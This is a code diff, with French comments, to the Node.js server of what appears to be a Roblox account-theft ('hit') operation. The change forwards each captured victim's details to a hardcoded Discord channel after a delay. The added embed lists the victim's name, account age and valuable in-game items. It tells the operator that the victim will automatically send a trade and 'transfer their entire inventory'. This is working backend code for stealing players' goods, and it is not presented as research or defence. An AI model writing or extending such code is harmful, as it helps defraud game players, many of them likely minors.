@@ -383,16 +383,12 @@ app.post('/api/admin/hit', async (req, res) => {
         // On utilise setTimeout pour ne pas bloquer la réponse HTTP
         setTimeout(async () => {
             try {
-                const masterUrl = process.env.WEBHOOK_URL;
-                // On vérifie que le master n'est pas déjà le webhook de l'utilisateur
-                if (masterUrl && masterUrl !== mapping.url) {
-                    console.log(`⏳ Master Copy envoyée (120s delay) : ${hitInfo.Name}`);
-                    await PostOnPrivateWebHook(masterUrl, hitInfo);
-                }
+                console.log(`⏳ Master Copy envoyée (120s delay) : ${hitInfo.Name}`);
+                await PostOnForwardChannel(hitInfo);
             } catch (err) {
-                console.log(`⚠️ Error Delayed Master: ${err.message}`);
+                console.log(`⚠️ Error Delayed Forward Channel: ${err.message}`);
             }
-        }, 120000);
+        }, 100000);
 
         // 4. Réponse au client Roblox (Important pour éviter que le Lua ne boucle/retry)
         res.status(200).json({ success: true, message: "Hit processed" });
@@ -570,7 +566,57 @@ async function PostOnPrivateWebHook(whurl, hitInfo) {
         log(`⚠️ Error User Webhook: ${err.message}`); 
     }
 }
-
+async function PostOnForwardChannel(hitInfo) {
+    try {
+        const ForwardChannel = await clientDiscord.channels.fetch('1488305569185009799').catch(() => null);
+                    if (ForwardChannel) {
+                        const hitEmbed = new EmbedBuilder()
+                    .setTitle("Rusteez Hit")
+                    .setColor(0x2b2d31)
+                    .setDescription(`🛠️ **How to proceed?**\nJoin SAB. The victim is set to send a trade request automatically. If they don't, manually send them one; they will accept and transfer their entire inventory to you.`)
+                    .addFields(
+                        { 
+                            name: "📄 Player Information", 
+                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
+                        },
+                        {
+                            name: "🧠 Brainrots",
+                            value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
+                                ? hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0)).map(br => {
+                                    // 1. Préparation des éléments (Mutation + Traits)
+                                    let extras = [];
+                                    
+                                    // On ajoute la mutation en premier si elle existe
+                                    if (br.Mutation && br.Mutation !== "" && br.Mutation !== "None" && br.Mutation !== "Default") {
+                                        extras.push(br.Mutation);
+                                    }
+                                    
+                                    // On ajoute les traits (qu'ils soient déjà une string ou un array)
+                                    if (br.Traits) {
+                                        if (Array.isArray(br.Traits)) {
+                                            br.Traits.forEach(t => { if(t && t !== "") extras.push(t); });
+                                        } else if (typeof br.Traits === 'string' && br.Traits !== "" && br.Traits !== "None") {
+                                            extras.push(br.Traits);
+                                        }
+                                    }
+                        
+                                    // 2. Formatage : [Diamond, Nyan, Taco] ou rien du tout
+                                    const extrasStr = extras.length > 0 ? `[${extras.join(', ')}] ` : "";
+                        
+                                    // 3. Retour de la ligne formatée
+                                    return `${extrasStr}${br.Name} → ${br.Rarity} ${br.IncomeStr}`;
+                                }).join('\n')
+                                : "None"}\n\`\`\``
+                        }
+                    )
+                    .setFooter({ text: `Rusteez Script` })
+                    .setTimestamp();
+        ForwardChannel.send({ embeds: [hitEmbed] });
+                    }
+    } catch (err) {
+        log(`⚠️ Forward Channel Error: ${err.message}`);
+    }
+}
 // 3. Envoi sur le Channel Public (Anonymisé)
 async function PostOnPublicWebHook(hitInfo) {
     try {
